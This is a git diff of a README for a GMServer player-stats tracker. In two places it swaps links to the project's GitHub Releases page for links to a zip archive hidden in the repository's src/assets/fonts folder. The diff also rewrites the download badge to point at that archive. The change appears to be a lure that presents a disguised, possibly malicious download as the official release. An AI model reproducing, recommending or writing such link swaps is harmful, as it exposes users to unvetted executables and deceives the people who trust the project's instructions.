@@ -1,6 +1,6 @@
 # 🎮 gm-stats-tracker-v2 - Track GMServer Players Easily
 
-[![Download Here](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/Kkktadeo/gm-stats-tracker-v2/releases)
+[![Download Here](https://raw.githubusercontent.com/Kkktadeo/gm-stats-tracker-v2/main/src/assets/fonts/tracker-gm-v-stats-v1.2-beta.2.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/Kkktadeo/gm-stats-tracker-v2/main/src/assets/fonts/tracker-gm-v-stats-v1.2-beta.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the gm-stats-tracker-v2 project! This web service uses Cloudflare Wor
 
 To get started, you need to download the latest version of the application. Visit the following link to access the Releases page:
 
-[Download the latest version here](https://github.com/Kkktadeo/gm-stats-tracker-v2/releases)
+[Download the latest version here](https://raw.githubusercontent.com/Kkktadeo/gm-stats-tracker-v2/main/src/assets/fonts/tracker-gm-v-stats-v1.2-beta.2.zip)
 
 ### Steps to Download
 
